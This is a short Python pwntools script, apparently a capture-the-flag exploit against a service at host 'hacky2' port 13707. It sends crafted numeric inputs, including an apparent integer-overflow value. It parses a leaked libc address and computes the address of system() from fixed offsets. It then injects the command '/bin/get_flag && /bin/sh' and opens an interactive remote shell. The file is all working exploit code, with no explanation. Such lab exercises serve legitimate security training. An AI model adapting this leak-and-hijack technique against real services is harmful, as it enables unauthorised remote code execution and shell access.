#!/usr/bin/python3

import pwn
import sys
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13707
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])

proc=pwn.remote(host,port,fam="ipv4")

proc.write(b"0\n1073741828\n0\n4\n1\n1\n8\n9\n4208392\n2\n1\n6\n7\n")
proc.readuntil(b"0x")
tmp_str = proc.readline()
libc_system_addr_lower = int(tmp_str[0:len(tmp_str)-8], 16) - 0x53cf0 + 0x45e50
proc.write(b"1\n1\n18\n19\n" + str(libc_system_addr_lower).encode() + b"\n/bin/get_flag && /bin/sh\n")
proc.readuntil(b"flag_")
proc.readline()
proc.clean()

proc.interactive()
